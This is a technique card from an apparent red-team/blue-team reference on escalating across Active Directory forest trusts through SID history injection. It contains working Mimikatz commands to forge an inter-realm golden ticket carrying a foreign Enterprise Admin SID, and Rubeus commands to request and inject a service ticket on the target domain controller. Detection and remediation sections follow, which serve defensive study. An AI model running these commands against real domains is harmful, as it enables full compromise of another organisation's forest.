# [PE-VALID-005]: Cross-Forest Trust Exploitation

## Metadata
| Attribute | Details |
|---|---|
| **Technique ID** | PE-VALID-005 |
| **MITRE ATT&CK v18.1** | [Valid Accounts: Domain Accounts (T1078.002)](https://attack.mitre.org/techniques/T1078/002/) |
| **Tactic** | Privilege Escalation / Lateral Movement |
| **Platforms** | Windows AD (Multi-Forest) |
| **Severity** | **High** |
| **Author** | SERVTEP (Pchelnikau Artur) |

## 2. EXECUTIVE SUMMARY
- **Concept:** When two forests trust each other, users from Forest A can access resources in Forest B. If SID Filtering is disabled (Quarantine: No), an attacker in Forest A can inject the Enterprise Admin SID of Forest B into their token (SID History Injection) and fully compromise Forest B. Even with SID Filtering, misconfigurations in **Selective Authentication** (e.g., allowing "Domain Users" to authenticate to a sensitive server) can allow lateral movement.
- **Attack Surface:** Trust Objects (`trustedDomain`).
- **Business Impact:** **Forest-to-Forest Hop**.

## 3. PREREQUISITES & CONFIGURATION
- **Required Privileges:** Domain Admin in Compromised Forest (Child/Partner).
- **Tools:**
    - [Mimikatz](https://github.com/gentilkiwi/mimikatz)
    - [Rubeus](https://github.com/GhostPack/Rubeus)

## 4. ATTACK (Red Team Operations)

#### 4.1 Usage
**Step 1: Check SID Filtering**
```powershell
Get-ADTrust -Filter * | Select Name, SIDFilteringQuarantined
```

**Step 2: Forge Inter-Realm Ticket**
Create a referral ticket using the Trust Key.
```cmd
kerberos::golden /user:Admin /domain:child.local /sid:CHILD_SID /sids:PARENT_SID-519 /rc4:TRUST_KEY /service:krbtgt /target:parent.local /ticket:referral.kirbi
```

**Step 3: Ask TGS**
Use the referral to ask for a service ticket in the parent domain.
```cmd
Rubeus.exe asktgs /ticket:referral.kirbi /service:cifs/dc.parent.local /ptt
```

## 5. DETECTION (Blue Team Operations)

#### 5.1 AD Logs
| Source | Event | Filter Logic |
|---|---|---|
| **Security** | 4769 | Kerberos Service Ticket. Look for `Status: 0x0` from a user in a different domain where the SID does not match the account's history (if filtering enabled, this fails; if disabled, it succeeds silently but might show up in PAC validation logs). |

## 6. DEFENSE & REMEDIATION (Hardening)

#### 6.2 Immediate Remediation
*   **Enable SID Filtering:** Enforce SID Filtering on all external/forest trusts.
*   **Selective Auth:** Use Selective Authentication to explicitly define which users can access which servers across the trust.

## 7. ATTACK CHAIN
> **Preceding Technique:** [PE-TOKEN-003]
> **Next Logical Step:** [LAT-CLASSIC-001]
